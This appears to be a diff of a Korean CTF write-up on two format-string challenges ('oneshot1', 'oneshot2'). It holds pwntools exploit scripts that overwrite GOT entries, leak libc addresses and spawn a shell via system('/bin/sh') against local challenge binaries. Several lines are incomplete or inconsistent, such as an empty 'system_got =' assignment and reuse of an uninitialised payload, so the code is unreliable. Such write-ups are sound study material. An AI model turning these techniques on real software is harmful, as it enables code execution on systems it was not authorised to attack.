@@ -32,11 +32,12 @@ p.interactive()
 
 ## oneshot1
 
-앞 문제와 다르게 system 함수만 주어져 있고 "/bin/sh"는 주어져 있지 않다. printf 함수의 got를 system 함수로 덮어쓰고 buf에 입력을 받을 때 "/bin/sh"를 입력하면 system("/bin/sh")를 실행할 수 있다. 이때 2번 이상 입력을 받아야 하므로 exit의 got를 main으로 덮어야 단계를 실행할 수 있을 것으로 보인다.  
-payload 단계를 구성할 수 있다.
+앞 문제와 다르게 system 함수만 주어져 있고 "/bin/sh"는 주어져 있지 않다. printf 함수의 got를 system 함수의 주소로 덮어쓰고 buf에 입력을 받을 때 "/bin/sh"를 입력하면 system("/bin/sh")를 실행할 수 있다. 이때 2번 이상 입력을 받아야 하므로 exit의 got를 main으로 덮어야 단계를 실행할 수 있을 것으로 보인다.  
+payload 단계를 구성하면 다음과 같다.
 1. exit_got을 main으로 덮는다.
-2. printf_got을 system으로 덮는다.
-3. "/bin/sh"을 전송한다.
+2. libc_leak을 진행하여 system 함수의 주소를 구한다.
+3. printf_got을 system으로 덮는다.
+4. "/bin/sh"을 전송한다.
 
 
 ```python
@@ -45,10 +46,9 @@ from pwn import *
 
 # context.log_level = 'debug'
 
-e = ELF("./oneshot")
+e = ELF("./oneshot1")
 p = process(e.path)
 libc = e.libc
-
 
 
 p.recvuntil(b"\n\n")
@@ -62,7 +62,7 @@ payload += p64(e.got["exit"])
 
 p.send(payload)
 
-
+system_got = 
 
 p.recvuntil(b"\n\n")
 payload = f'%{e.symbols["system"] >> 16}c'.encode() #system_high
@@ -87,51 +87,45 @@ p.interactive()
 
 ## oneshot2
 
-system 함수와 "/bin/sh"가 주어져 있지 않으므로 libc_leak을 통해 구해서 풀어야 하는 문제로 보인다
-
-
+system 함수와 "/bin/sh"가 주어져 있지 않으므로 libc_leak을 통해 구해서 풀어야 하는 문제로 보인다.
+payload 단계를 구성하면 다음과 같다.
+1. exit_got을 main으로 덮는다.
+2. libc_leak을 진행하여 system 함수의 주소를 구한다.
+3. printf_got을 system으로 덮는다.
+4. "/bin/sh"을 전송한다.
 
 
 ```python
 
 from pwn import *
 
-p = process('./fsb_got64_2')
-e = ELF('./fsb_got64_2')
+e = ELF('./oneshot2')
+p = process(e.path)
 libc = e.libc
 
 
 main = e.symbols['main']
-exit_got = e.got['exit']
 printf_got = e.got['printf']
-
-log.info('\texit@got '+hex(exit_got))
-log.info('\tmain '+hex(main))
 
 
 main_low = main & 0xffff
 main_high = (main >> 16) & 0xffff
 
-log.info('### main ###')
-log.info('[1] input : exit@got -> main')
 
-# offset 6
-payload = ''
-payload += '%{}c'.format(main_high)
-payload += '%9$hn'
-payload += '%{}c'.format(main_low - main_high)
-payload += '%10$hn'
-payload += 'AAA'
-payload += p64(exit_got + 2)
-payload += p64(exit_got)
+p.recvuntil(b"\n\n")
+payload += f'%{main_high}c'.encode()
+payload += b'%10$hn'
+payload += f'%{main_low - main_high}c'.encode()
+payload += b'%11$hn'
+payload = payload.ljust(0x20, b"\x00")
+payload += p64(e.got["exit"] + 2)
+payload += p64(e.got["exit"])
 
 #pause()
 p.send(payload)
 
 
-log.info('### main ###')
-log.info('[2] libc leak')
-
+p.recvuntil(b"\n\n")
 payload = ''
 payload += 'leak:%77$p'
 
@@ -150,8 +144,6 @@ log.info('\tprintf@got '+hex(printf_got))
 log.info('\tsystem '+hex(system))
 
 
-
-###
 system_low = system & 0xffff
 system_middle = (system >> 16) & 0xffff
 system_high = (system >> 32) & 0xffff
@@ -172,25 +164,26 @@ else:
 log.info('### main ###')
 log.info('[3] input : printf@got -> system')
 
-# offset 6
-payload = ''
-payload += '%{}c'.format(low)
-payload += '%11$hn'
-payload += '%{}c'.format(middle)
-payload += '%12$hn'
-payload += '%{}c'.format(high)
-payload += '%13$hn'
+
+p.recvuntil(b"\n\n")
+payload += f'%{low}c'.encode()
+payload += b'%11$hn'
+payload += f'%{middle}c'.encode()
+payload += b'%12$hn'
+payload += f'%{high}c'.encode()
+payload += b'%13$hn'
 payload += 'A' * (8 - len(payload) % 8)
 payload += p64(printf_got)
 payload += p64(printf_got + 2)
 payload += p64(printf_got + 4)
+
 
 pause()
 p.send(payload)
 
 log.info('### main ###')
 log.info('[4] input : /bin/sh\x00')
-p.send('/bin/sh\x00')
+p.send(b'/bin/sh\x00')
 
 p.interactive()
 
